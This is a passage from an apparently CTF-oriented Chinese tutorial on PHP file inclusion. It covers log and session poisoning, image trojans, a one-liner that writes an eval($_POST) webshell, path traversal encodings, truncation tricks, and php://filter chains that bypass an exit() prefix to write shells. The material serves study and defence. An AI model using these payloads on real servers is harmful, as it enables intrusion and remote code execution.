<p> /etc/httpd/conf/httpd.conf   或者   index.php?page=/etc/init.d/httpd</p>
<p> (2) IIS6.0+win2003 配置文件</p>
<p> C:/Windows/system32/inetsrv/metabase.xml</p>
<p>(3) IIS7.0+WIN 配置文件</p>
<p> C:\Windows\System32\inetsrv\config\applicationHost.config</p>
<p><strong>注意：浏览器直接构造的PHP一句话中特殊字符，会被浏览器自动进行URL转义，导致最终写入日志文件中的PHP一句话包含了这些特殊字符，而这些转码后的编码PHP并不能进行正常的解析。</strong></p>
<p><strong>curl构造一句话时，需要注意两点：</strong></p>
<p> 1）请求的资源对象，需要被双引号包含，不然会报错；<br> 2） php一句话中的 综括号[ ]curl是特殊符号，需要进行转义 [ ]，不然curl使用时也会报错；</p>
<p> Curl 命令行url资源请求，没有像浏览器对特殊字符进行url的转码，所以原封不动的将请求报错的php一句话信息写入了服务日志文件中。随后我们利用文件包含漏洞正常包含解析了本地服务器的日志文件中夹带的“php一句话木马”；</p>
<p>burpsuit 代理抓包改包构造一句话写入日志文件，burpsuit 代理抓包，修改浏览器转码字符，写入正确的php一句话木马到服务器日志文件。</p>
<p>使用burpsuit修改了浏览器访问转码的字符，事情安装我们一句话原本的格式记录进日志文件，并能被php正常解析。</p>
<h2 id="0x06-包含SESSION"><a href="#0x06-包含SESSION" class="headerlink" title="0x06 包含SESSION"></a>0x06 包含SESSION</h2><p>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p>
<p><strong>利用条件：</strong></p>
<ul>
<li>找到Session内的可控变量</li>
<li>Session文件可读写，并且知道存储路径</li>
</ul>
<p>php的session文件的保存路径可以在phpinfo的session.save_path看到。</p>
<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226222627659.png" alt="image-20220226222627659"></p>
<p>session常见存储路径：</p>
<pre><code>/var/lib/php/sess_PHPSESSID
/var/lib/php/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
session文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到
</code></pre>
<h2 id="0x07-包含-pros-self-environ"><a href="#0x07-包含-pros-self-environ" class="headerlink" title="0x07 包含/pros/self/environ"></a>0x07 包含/pros/self/environ</h2><p>proc/self/environ中会保存user-agent头，如果在user-agent中插入php代码，则php代码会被写入到environ中，之后再包含它，即可。</p>
<p><strong>利用条件：</strong></p>
<ul>
<li>php以cgi方式运行，这样environ才会保持UA头。</li>
<li>environ文件存储位置已知，且environ文件可读。</li>
</ul>
<h2 id="0x08-包含临时文件"><a href="#0x08-包含临时文件" class="headerlink" title="0x08 包含临时文件"></a>0x08 包含临时文件</h2><p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p>
<p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考参考[LFI With PHPInfo Assistance](<a target="_blank" rel="noopener" href="https://www.insomniasec.com/downloads/publications/LFI">https://www.insomniasec.com/downloads/publications/LFI</a> With PHPInfo Assistance.pdf)</p>
<h2 id="0x09-包含上传文件"><a href="#0x09-包含上传文件" class="headerlink" title="0x09 包含上传文件"></a>0x09 包含上传文件</h2><p>很多网站通常会提供文件上传功能，比如：上传头像、文档等，这时就可以采取上传一句话图片木马的方式进行包含。</p>
<p>图片马的制作方式如下，在cmd控制台下输入：</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">进入<span class="number">1</span>.<span class="keyword">jph和2.php的文件目录后，执行：</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line">copy  <span class="number">1</span>.<span class="keyword">jpg/b+2.php </span> <span class="number">3</span>.<span class="keyword">jpg</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line">将图片<span class="number">1</span>.<span class="keyword">jpg和包含php代码的2.php文件合并生成图片马3.jpg</span></span><br></pre></td></tr></table></figure>

<p>假设已经上传一句话图片木马到服务器，路径为/upload/201811.jpg<br>图片代码如下：</p>
<?fputs(fopen("shell.php","w"),"<?php eval($_POST['pass']);?><p>“)?&gt;</p>
<pre><code>1
</code></pre>
<p>然后访问URL：<a target="_blank" rel="noopener" href="http://www.xxxx.com/index.php?page=./upload/201811.jpg%EF%BC%8C%E5%8C%85%E5%90%AB%E8%BF%99%E5%BC%A0%E5%9B%BE%E7%89%87%EF%BC%8C%E5%B0%86%E4%BC%9A%E5%9C%A8index.php%E6%89%80%E5%9C%A8%E7%9A%84%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%94%9F%E6%88%90shell.php">http://www.xxxx.com/index.php?page=./upload/201811.jpg，包含这张图片，将会在index.php所在的目录下生成shell.php</a></p>
<h1 id="文件包含漏洞的绕过方法"><a href="#文件包含漏洞的绕过方法" class="headerlink" title="文件包含漏洞的绕过方法"></a>文件包含漏洞的绕过方法</h1><h2 id="0x01-指定前缀绕过"><a href="#0x01-指定前缀绕过" class="headerlink" title="0x01 指定前缀绕过"></a>0x01 指定前缀绕过</h2><h3 id="一、目录遍历"><a href="#一、目录遍历" class="headerlink" title="一、目录遍历"></a>一、目录遍历</h3><p>使用 ../../ 来返回上一目录，被称为目录遍历(Path Traversal)。例如 ?file=../../phpinfo/phpinfo.php<br> 测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">	<span class="comment">//前缀</span></span><br><span class="line">	<span class="keyword">include</span> <span class="string">&quot;/var/www/html/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>现在在/var/log目录下有文件flag.txt，则利用…/可以进行目录遍历，比如我们尝试访问：</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>.php?<span class="keyword">file</span>=..<span class="regexp">/../</span>log/flag.txt</span><br></pre></td></tr></table></figure>

<p>则服务器端实际拼接出来的路径为：/var/www/html/../../log/test.txt，即 /var/log/flag.txt，从而包含成功。</p>
<h3 id="二、编码绕过"><a href="#二、编码绕过" class="headerlink" title="二、编码绕过"></a>二、编码绕过</h3><p>服务器端常常会对于../等做一些过滤，可以用一些编码来进行绕过。</p>
<p><strong>1.利用url编码</strong></p>
<ul>
<li>../<ul>
<li>%2e%2e%2f</li>
<li>..%2f</li>
<li>%2e%2e/</li>
</ul>
</li>
<li>..\<ul>
<li>%2e%2e%5c</li>
<li>..%5c</li>
<li>%2e%2e\</li>
</ul>
</li>
</ul>
<p><strong>2.二次编码</strong></p>
<ul>
<li>../   <ul>
<li>%252e%252e%252f</li>
</ul>
</li>
<li>..\   <ul>
<li>%252e%252e%255c</li>
</ul>
</li>
</ul>
<p><strong>3.容器/服务器的编码方式</strong></p>
<ul>
<li><p>../</p>
<ul>
<li><p>..%c0%af</p>
</li>
<li><p>%c0%ae%c0%ae/</p>
<p>注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）Apache Tomcat Directory Traversal</p>
</li>
</ul>
</li>
<li><p>..\</p>
<ul>
<li>..%c1%9c</li>
</ul>
</li>
</ul>
<h2 id="0x10-指定后缀绕过"><a href="#0x10-指定后缀绕过" class="headerlink" title="0x10 指定后缀绕过"></a>0x10 指定后缀绕过</h2><p>后缀绕过测试代码如下，下述各后缀绕过方法均使用此代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">	<span class="comment">//后缀</span></span><br><span class="line">	<span class="keyword">include</span> <span class="variable">$file</span>.<span class="string">&quot;.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="一、利用url"><a href="#一、利用url" class="headerlink" title="一、利用url"></a>一、利用url</h3><p>在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制。<br> 可参考此文章：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2c07fbb52b45">URI’s fragment</a></p>
<p>完整url格式：</p>
<p>protocol :// hostname[:port] / path / [;parameters][?query]#fragment</p>
<p><strong>query(?)</strong></p>
<ul>
<li>[访问参数] <code>?file=http://localhost:8081/phpinfo.php?</code></li>
<li>[拼接后]  ?file=<a target="_blank" rel="noopener" href="http://localhost:8081/phpinfo.php?.txt">http://localhost:8081/phpinfo.php?.txt</a></li>
</ul>
<p><strong>Example：</strong>（设在根目录下有flag2.txt文件）</p>
<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226224648338.png" alt="image-20220226224648338"></p>
<p><strong>fragment(#)</strong></p>
<ul>
<li>[访问参数] <code>?file=http://localhost:8081/phpinfo.php%23</code></li>
<li>[拼接后]  ?file=<a target="_blank" rel="noopener" href="http://localhost:8081/phpinfo.php#.txt">http://localhost:8081/phpinfo.php#.txt</a></li>
</ul>
<p><strong>Example：</strong>（设在根目录下有flag2.txt文件）</p>
<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226224742608.png" alt="image-20220226224742608"></p>
<h3 id="二、利用协议"><a href="#二、利用协议" class="headerlink" title="二、利用协议"></a>二、利用协议</h3><p>利用zip://和phar://，由于整个压缩包都是我们的可控参数，那么只需要知道他们的后缀，便可以自己构建。</p>
<p>zip://</p>
<pre><code>[访问参数] ?file=zip://D:\zip.jpg%23phpinfo
[拼接后]  ?file=zip://D:\zip.jpg#phpinfo.txt
</code></pre>
<p>phar://</p>
<pre><code>[访问参数] ?file=phar://zip.zip/phpinfo
[拼接后]  ?file=phar://zip.zip/phpinfo.txt
</code></pre>
<p>Example：<br>(我的环境根目录中有php.zip压缩包，内含phpinfo.txt，其中包含代码<?php phpinfo();?>)）<br>所以分别构造payload为：</p>
<p>?file=zip://D:\PHPWAMP_IN3\wwwroot\php.zip%23phpinfo</p>
<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226224921625.png" alt="image-20220226224921625"></p>
<p>?file=phar://../../php.zip/phpinfo</p>
<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226224952562.png" alt="image-20220226224952562"></p>
<h3 id="三、长度截断"><a href="#三、长度截断" class="headerlink" title="三、长度截断"></a>三、长度截断</h3><p>利用条件：</p>
<pre><code>php版本 &lt; php 5.2.8
</code></pre>
<p>原理：</p>
<pre><code>Windows下目录最大长度为256字节，超出的部分会被丢弃
Linux下目录最大长度为4096字节，超出的部分会被丢弃。
</code></pre>
<p>利用方法：</p>
<pre><code>只需要不断的重复 ./(Windows系统下也可以直接用 . 截断)

  ?file=./././。。。省略。。。././shell.php
    1
</code></pre>
<p>则指定的后缀.txt会在达到最大值后会被直接丢弃掉</p>
<p>四、%00截断</p>
<p>利用条件：</p>
<pre><code>magic_quotes_gpc = Off
php版本 &lt; php 5.3.4
</code></pre>
<p>利用方法：</p>
<pre><code>直接在文件名的最后加上%00来截断指定的后缀名

  ?file=shell.php%00
</code></pre>
<p>注：现在用到%00阶段的情况已经不多了</p>
<p>文件包含漏洞防御</p>
<pre><code>allow_url_include和allow_url_fopen最小权限化

设置open_basedir（open_basedir 将php所能打开的文件限制在指定的目录树中）

白名单限制包含文件，或者严格过滤 
</code></pre>
<h2 id="0x11-file-put-content"><a href="#0x11-file-put-content" class="headerlink" title="0x11 file_put_content"></a>0x11 <strong>file_put_content</strong></h2><p>file_put_content大概有三种情形出现；</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file<span class="constructor">_put_contents($<span class="params">filename</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.$<span class="params">content</span>)</span>;</span><br><span class="line">file<span class="constructor">_put_contents($<span class="params">content</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.$<span class="params">content</span>)</span>;</span><br><span class="line">file<span class="constructor">_put_contents($<span class="params">filename</span>,$<span class="params">content</span> . <span class="string">&quot;\nxxxxxx&quot;</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>思路一般是想要将杂糅或者死亡代码分解掉；这里思路基本上都是利用php伪协议filter，结合编码或者相应的过滤器进行绕过；其原理不外乎是将死亡或者杂糅代码分解成php无法识别的代码；</p>
<h3 id="首先对于第一种情况"><a href="#首先对于第一种情况" class="headerlink" title="首先对于第一种情况"></a><strong>首先对于第一种情况</strong></h3><p>直观的看到，我们的文件名和文件内容都是可控的，这种的相对来说简单的多，我们直接控制文件名，和文件内容即可，下面分享几种方式；</p>
<ol>
<li>  <strong>base64编码绕过</strong></li>
</ol>
<p>原理其实很简单，利用base64解码，将死亡代码解码成乱码，使得php引擎无法识别；</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$file</span>name=<span class="string">&#x27;php://filter/convert.base64-decode/resource=s1mple.php&#x27;</span>;</span><br><span class="line"><span class="symbol">$co</span>ntent = <span class="string">&#x27;aPD9waHAgcGhwaW5mbygpOz8+&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>这里之所以将$content加了一个a，是因为base64在解码的时候是将4个字节转化为3个字节，又因为死亡代码只有phpexit参与了解码，所以补上一位就可以完全转化；载荷效果如下：</p>
<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPLN4K.png" alt="img"></p>
<ol start="2">
<li> <strong>rot13 编码绕过</strong></li>
</ol>
<p>原理和base64一样，可以直接转码分解死亡代码；</p>
<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220228211810119.png" alt="image-20220228211810119"></p>
<p>只是这种方法有点尴尬的是；因为我们生成的文件内容之中前面的<code>&lt;?</code>并没有分解掉，这时，如果服务器开启了短标签，那么就会被解析，所以所以后面的代码就会错误；也就失去了作用；</p>
<p><strong>3.    .htaccess的预包含利用</strong></p>
<p>利用 .htaccess的预包含文件的功能来进行攻破；自定义包含我们的flag文件。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span>=php:<span class="regexp">//</span>filter<span class="regexp">/write=string.strip_tags/</span>resource=.htaccess</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span>=?&gt;php_value%<span class="number">20</span>auto_prepend_file%<span class="number">20</span>G:\s1mple.php</span><br></pre></td></tr></table></figure>

<p>同时传入如上的代码，首先来解释$filename的代码，这里引用了string.strip_tags过滤器，可以过滤.htaccess内容的html标签，自然也就消除了死亡代码；$content即闭合死亡代码使其完全消除，并且写入自定义包含文件；实验结果如下所示：</p>
<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPHLCD.png" alt="img"></p>
<p>但是这种方法也是具有一定的局限性，首先我们需要知道flag文件的位置，和文件的名字，一般的比赛中可以盲猜  flag.php flag   /flag  /flag.php  等等；另外还有个很大的问题是，string.strip_tags过滤器只是可以在php5的环境下顺利的使用，如果题目环境是在php7.3.0以上的环境下，则会发生段错误。导致写不进去；根本来说是php7.3.0中废弃了string.strip_tags这个过滤器；</p>
<ol start="4">
<li> <strong>过滤器编码组合拳</strong></li>
</ol>
<p>过滤器组合拳，其实故名思意，就是利用过滤器嵌套过滤器进行过滤，以此达到代码的层层更迭，从而最后写入我们期望的代码；</p>
<p><strong>先来一种：</strong></p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$file</span>name=<span class="string">&#x27;php://filter/string.strip_tags|convert.base64-decode/resource=s1mple.php&#x27;</span></span><br><span class="line"><span class="symbol">$co</span>ntent=<span class="string">&#x27;?&gt;PD9waHAgcGhwaW5mbygpOz8+&#x27;</span></span><br></pre></td></tr></table></figure>

<p>可以看到，利用string.strip_tags可以过滤掉html标签，将标签内的所有内容进行删去，然后再进行base64解码，成功写入shell；</p>
<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPLobn.png" alt="img"></p>
<p>但是这种方法有一定的局限性也还是因为string.strip_tags在php7.3.0以上的环境下会发生段错误，从而导致无法写入，但是在php5的环境下则不受此影响；</p>
<p><strong>再来另外一种</strong></p>
<p>如果题目的环境是php7的话，那么我们又该如何？这里受一个题目的启发，也可以使用过滤器进行嵌套来做；组合拳；这里三个过滤器叠加之后先进行压缩，然后转小写，最后解压，会导致部分死亡代码错误；则可以写入shell；</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span>=php:<span class="comment">//filter/zlib.deflate|string.tolower|zlib.inflate|/resource=s1mple.php</span></span><br><span class="line"><span class="variable">$content</span>=php:<span class="comment">//filter/zlib.deflate|string.tolower|zlib.inflate|<span class="meta">?&gt;</span><span class="meta">&lt;?php</span>%0dphpinfo();<span class="meta">?&gt;</span>/resource=s1mple.php</span></span><br></pre></td></tr></table></figure>

<p>如此便可以写入；其原理也很简单，就是利用过滤器嵌套让死亡代码在各种变换之间进行分解扰乱，然后再次写入木马；</p>
<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/08/14/dPHcNT.png"><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPHcNT.png" alt="img"></a></p>
<p>这里非常巧合的是内容经过压缩转小写然后解压之后，我们的目的代码并没有发生变化，这也为写入木马奠定了基础；</p>
<h3 id="介绍第二种情况"><a href="#介绍第二种情况" class="headerlink" title="介绍第二种情况"></a><strong>介绍第二种情况</strong></h3><p><code>file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);</code>如此又该如何；</p>
<p>利用php伪协议filter进行嵌套过滤器进行消除死亡代码，然后进行shell的写入或者读取；不过这种因为是一个变量，所以其限制代码为<code>&lt;?php exit()</code>;  然而我们之前说到的是因为是控制两个变量，在这种情况之下就为<code>&lt;?php exit();?&gt;</code>,两者有本质的区别，然而第一种情况下，后面的几种解法，其实从某种程度上来说，也是将其看成了一个变量从而的出的payload；</p>
<p>这里题目环境如果在php7下，wmctf的wp上已经写的很清楚了，有多种方法可以绕过去；这里不再过多的解释；</p>
<p>但是这里想要分享的一个另类的方法，如果题目环境不是在php7下，并且过滤了zlib的话，又该如何去解答，再使用过滤器去压缩和解压就不太可能实现了；这里提供一种我新实验成的方法，利用.htaccess进行预包含，然后读取flag；</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="keyword">string</span>.strip_tags/<span class="meta">?&gt;</span>php_value%<span class="number">20</span>auto_prepend_file%<span class="number">20</span>G:\s1mple.php%<span class="number">0</span><span class="keyword">a</span>%<span class="number">23</span>/resource=.htaccess</span><br></pre></td></tr></table></figure>

<p>这里可以直接自定义预包含文件，进行测试；结果如下；</p>
<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPHRCF.png" alt="img"></p>
<p>再次访问页面即可包含flag文件，进行读取<img src="https://s1.ax1x.com/2020/08/14/dPHXgH.png" alt="img"></p>
<p><strong>Base64</strong></p>
<p>看到这种情况其实也可以想到base64利用，payload：：</p>
<p><code>php://filter/convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=s1mple.php</code>或者</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">php</span>://filter/convert.base<span class="number">64</span>-decode/resource=PD<span class="number">9</span>waHAgcGhwaW<span class="number">5</span>mbygpOz<span class="number">8</span>+.php</span><br></pre></td></tr></table></figure>

<p>看起来顺理成章，进行拼接之后就是<code>&lt;?php exit();php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</code>然后会对其进行一次整体的base64-decode。从而分解掉死亡代码，但是有个小问题，当时我也有点不解，一直无法生成content；虽然文件创建成功，但是就是无法生成content。翻了翻cyc1e师傅的文章，和其他文章 ，发现问题在于‘=’；</p>
<p>都知道‘=’在base64中的作用是填充，也就是以为着结束；在‘=’的后面是不允许有任何其他字符的否则会报错，有的解码程序会自动忽略后面的字符从而正常解码，其实实际上还是有问题的。如下图所示；</p>
<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPHW34.png" alt="img"></p>
<p>这里因为是由于‘=’从而使得我们写入content不成功，那么我们可以想个方法去掉等号即可，</p>
<p><strong>去掉等号之过滤器嵌套base64</strong></p>
<p>payload：  <code>php://filter/string.strip.tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php</code>如此payload我们测试看看载荷效果；</p>
<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPL0jH.png" alt="img"></p>
<p>发现可以生成文件，并且可以看到我们已经成功写入了shell；但是文件名确实有问题，当我们在浏览器访问的时候，会出现访问不到的问题，这里是因为引号的问题；那么如何避免，我们可以使用伪目录的方法，进行变相的绕过去；</p>
<p>改payload为此：<code>php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code>我们将前面的一串base64字符和闭合的符号整体看作一个目录，虽然没有，但是我们后面重新撤回了原目录，生成s1mple.php文件；从而就可以生成正常的文件名；载荷效果如下：</p>
<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPLDud.png" alt="img"></p>
<p><strong>去掉等号之直接对内容进行变性另类base64</strong></p>
<p>其实这种也是借助于过滤器，但是原理并不是和之前的原理一样，之前的原理即是：闭合原本的死亡代码，然后在进行过滤器过滤掉内容中的html标签，从而对剩下的内容进行base64解码。但是这种方法却不是如此，payload如下：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">php</span>://filter/&lt;?|string.strip_tags|convert.base<span class="number">64</span>-decode/resource=?&gt;PD<span class="number">9</span>waHAgcGhwaW<span class="number">5</span>mbygpOz<span class="number">8</span>%<span class="number">2</span>B/../s<span class="number">1</span>mple.php</span><br></pre></td></tr></table></figure>

<p>这种方法也是新奇，在一片文章中发现，但是他的payload无法进行攻击成功，我借助其思路重新构造了一个新的payload；这种payload的攻击原理即是首先直接在内容时，就将我们base64遇到的‘=’这个问题直接写在<code>&lt;? ?&gt;</code>中进行过滤掉，然后base64-decode再对原本内容的<code>&lt;?php exit();</code>进行转码，从而达到分解死亡代码的效果；这是两种攻击思路；</p>
<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPLFXj.png" alt="img"></p>
<p><strong>rot13</strong></p>
<p>尽管base64比较特别，但是并不是所有的编码都受限于‘=’，这里可以采用rot13编码即可；</p>
<p><code>php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=s1mple.php</code>这里<code>&lt;?php phpinfo();?&gt;</code>的rot13编码即为<code>&lt;?cuc cucvasb();?&gt;</code>,所以这里可以进行写入；载荷效果如下：</p>
<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPH5uR.png" alt="img"></p>
<p>其原理就是利用转码从而将原本的死亡代码进行转码从而使引擎无法识别从而避免死亡代码；</p>
<h3 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv."></a><strong>convert.iconv.</strong></h3><p>这个过滤器需要 php 支持 <code>iconv</code>，而 iconv 是默认编译的。使用convert.iconv.*过滤器等同于用<code>iconv()</code>函数处理所有的流数据。 然而 我们可以留意到 <code>iconv — 字符串按要求的字符编码来转换</code>;;其用法：<code>iconv ( string $in_charset , string $out_charset , string $str ) : string</code>   将字符串 <code>str</code> 从 <code>in_charset</code> 转换编码到 <code>out_charset</code>。 就其功能而论，有点类似于<code>base_convert</code>的功效一样，只不过二者还是有作用的区别，只是都是涉及编码转换的问题而已；（可以类比）；由此记得国赛的一道love_math的题目，有了base_convert之后就可以尽情的转换从而getshell；</p>
<p>那么我们就可以借用此过滤器，从而进行编码的转换，写入我们需要的代码，然后转换掉死亡代码，其实本质上来说也是利用了编码的转换；</p>
<h3 id="1-usc-2"><a href="#1-usc-2" class="headerlink" title="1.usc-2"></a><strong>1.usc-2</strong></h3><p>通过usc-2的编码进行转换；对目标字符串进行2位一反转；（因为是两位一反转，所以字符的数目需要保持在偶数位上）</p>
<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPHID1.png" alt="img"></p>
<p>payload：<code>php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSs[m1lp]e;)&gt;?/resource=s1mple.php</code>;其实也是变向的转换回来，从而利用那一次转换对死亡代码进行扰乱；载荷效果</p>
<h3 id="2-usc-4"><a href="#2-usc-4" class="headerlink" title="2.usc-4"></a><strong>2.usc-4</strong></h3><p>活用convert.iconv。可以进行usc-4编码转化；就是4位一反转；类比可知，构造的shell代码应该是usc-4中的4倍数；</p>
<h3 id="3-utf-8与utf-7之间的转化"><a href="#3-utf-8与utf-7之间的转化" class="headerlink" title="3.utf-8与utf-7之间的转化"></a>3.utf-8与utf-7之间的转化</h3><p>经过测试发现如下的现象：</p>
<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPHb4O.png" alt="img"><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPLfgg.png" alt="img"></p>
<p>这里发现生成的是<code>+AD0-</code>,然而经过检测，此字符串可以被base64进行解码；那也就意味着我们可以使用这种方法避免等号对我们base64解码的影响；我们可以直接写入base64加密后的payload，然后将其进行utf之间的转换，因为纯字符转换之后还是其本身；所以其不受影响，进而我们的base64-encode之后的编码依然是存在的，然后进行base64-decode一下，写入shell；算上是一种组合拳；</p>
<p><code>php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=s1mple.php</code> 载荷效果如下：</p>
<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPzFjU.png" alt="img"><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPzAuF.png" alt="img"></p>
